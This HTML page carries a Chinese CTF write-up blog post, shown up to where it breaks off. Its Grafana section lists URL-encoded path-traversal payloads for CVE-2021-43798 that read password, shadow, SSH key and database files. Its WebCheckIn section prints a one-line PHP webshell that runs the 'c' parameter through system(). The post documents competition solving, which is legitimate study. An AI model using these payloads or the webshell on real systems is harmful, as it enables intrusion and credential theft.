@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2022/05/26/security/ctf/ctf比赛复盘（二）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF比赛复盘（二）">
+<meta property="og:url" content="http://forestsetyou.github.io/2022/05/26/Security/CTF/CTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526164929142-603201838.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165002908-1001932290.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165018284-706021175.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165153116-726942767.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165224110-1789565434.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165327821-644099417.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165346212-187707827.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165353606-537752174.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165403321-1565408337.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165426328-47703195.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165439131-1694109796.png">
+<meta property="article:published_time" content="2022-05-26T08:55:00.000Z">
+<meta property="article:modified_time" content="2022-05-26T08:55:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526164929142-603201838.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CTF比赛复盘（二） -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-1.png" alt="CTF比赛复盘（二）" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CTF比赛复盘（二）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-05-26 16:55</span>
+        <span class="mobile">2022-05-26 16:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2022-05-26 16:55</span>
+            <span class="mobile">2022-05-26 16:55</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="CTF"><a href="#CTF" class="headerlink" title="*CTF"></a>*CTF</h1><p>网址：<a class="link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/competition/detail?id=184&hash=33d1ec91-6c1d-4c33-9ff2-558c802ced92.event" >*CTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44573207/article/details/116712695" >W1nk-Grafana使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h3><p>提供的网址Grafana版本都是8.2.6，github上可以看到8.2.7修复了一个BUG：<a class="link"   target="_blank" rel="noopener" href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/" >Path Traversal(CVE-2021-43798) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，提供了一个依据该漏洞制作的嗅探工具：<a class="link"   target="_blank" rel="noopener" href="https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798" >exploit-grafana-CVE-2021-43798 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。注意使用该工具时，填写目标url在一个文件中，url最后不要带 <code>/</code> 。下载下来的文件如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526164929142-603201838.png"
+                     
+                ></p>
+<p>嗅探路径如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2fconf/grafana.ini</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/defaults.ini</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.bash_history</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.ssh/id_rsa</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.bash_history</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.ssh/id_rsa</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fusr/local/etc/grafana/grafana.ini</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/fib_trie</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/tcp</span><br><span class="line">/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline</span><br></pre></td></tr></table></figure></div>
+
+<p><code>%2f</code> 用于避开浏览器的前端过滤，它会自行处理目录穿越语句使之简化为穿越后的结果，这当然不是我们想要的，所以采用URL编码先行处理。同时并非每个插件都有用，首先要已安装，其次好像还有权限要求，所以需要多次尝试。</p>
+<p>在”grafana.ini”文件中找到可登录的账号密码如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165002908-1001932290.png"
+                     
+                ></p>
+<p>我也不知道”secret_key”是干啥的…</p>
+<p>进去后创建新查询，选中Mysql中的”ffffllllaaaagggg”，设置查询条件。不知道为什么模板查询一定要带个时间，怎么都丢不掉，无奈之下选择语句编辑模式，直接输出整张表，得到flag。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165018284-706021175.png"
+                     
+                ></p>
+<p>这个服务器可能有点不稳定，有时候会自动重启，再进去时Mysql数据库就不见了。</p>
+<p>总结：重要文件的可能位置取决于服务器的环境如何，要么尝试亲自部署环境弄清楚一些重要文件的位置，要么查找资料或脚本直接写出嗅探路径。</p>
+<p><em>2022.4.19更新</em></p>
+<p>好吧我纯菜逼。Mysql数据库需要在配置文件中找到对应的密码，通过configuration加载才能得到，所以没有数据库才是正常的&#x3D; &#x3D;</p>
+<h2 id="BlockChain"><a href="#BlockChain" class="headerlink" title="BlockChain"></a>BlockChain</h2><h3 id="treasure-hunters"><a href="#treasure-hunters" class="headerlink" title="treasure-hunters"></a>treasure-hunters</h3><p>题目模板：<a class="link"   target="_blank" rel="noopener" href="https://github.com/chainflag/eth-challenge-base" >@Github:eth-challenge-base <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>参考：[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://max.book118.com/html/2021/0917/6021230134004005.shtm" >RealWorldCTF 2020 以太坊题目两则：EasyDefi &amp; Re_Montagy .pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deployer account: 0x486DC1Dbf3AdEE06C9F44481b8760c0c6BD6F593</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token: v4.local.r6WNRWSQAZFMCI5tGva2odXD_5mbcrsMsrVvB7f4CJ5mxDy4H1jFiFvffvVfDxeioeaBbMuH2bKOwxhngk4G2m73ChlqxJDS5LOgyGQj0My7fBpV9ZLzmYT3AtItCq7wrcLAmeQIrx9ZyyT9iAqLJAb8AfQ6xgSZw3IWXiElQ3auaA</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tips:</span><br><span class="line">please transfer 0.00143 test ether to the deployer account for next step</span><br></pre></td></tr></table></figure></div>
+
+<p>首先需要了解以太坊概念：<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E5%9D%8A/20865117?fromtitle=Ethereum&fromid=20865119&fr=aladdin" >百度百科-以太坊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h5 id="Show-the-contract-source-code"><a href="#Show-the-contract-source-code" class="headerlink" title="Show the contract source code"></a>Show the contract source code</h5><p>附件的 <code>.sol</code> 不是flash的cookie文件，实际是solidity语言 的合约源码：</p>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43031412/article/details/103157699" >kevinhwu-solidity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mrctf.fun/" >MRCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>一个Wordle小游戏（用React的写的，好亲切，可是还是破解不来&#x3D; &#x3D;）</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/cwackerfuss/react-wordle" >Worlde源码-Github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://juejin.cn/post/7070072148731101214" >Wordle作弊器！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>一番搜索后在源码中找到了flag的Base64编码版，解码后得到flag。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165153116-726942767.png"
+                     
+                ></p>
+<p>从源码中可以看到，需要在规定次数内猜出字符串才算成功一次，成功一伯次后才能得到flag，这是本来的游戏设定</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="WebCheckIn"><a href="#WebCheckIn" class="headerlink" title="WebCheckIn"></a>WebCheckIn</h3><p>上传文件发现不让传”.php”文件，传过的文件也访问不到，nkk指教说虽然官方不建议你扫，但是你能扫出一个默认配置好的马，于是就装了一个”dirmap：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165224110-1789565434.png"
+                     
+                ></p>
+<p>在已知答案的情况下手动在字典里添加了路径才给它扫出来，访问后会出现报错：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined index: c in /<span class="keyword">var</span>/www/html/test.php on line <span class="number">1</span></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/test.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p>会看到一个 <code>system()</code> 函数和一个 <code>c</code> 警告，在本地服务器上测试以下语句：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;CAN I GET FLAG？&#x27;</span>; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>会看见如下报错：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in D:\phpstudy_pro\WWW\mm.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
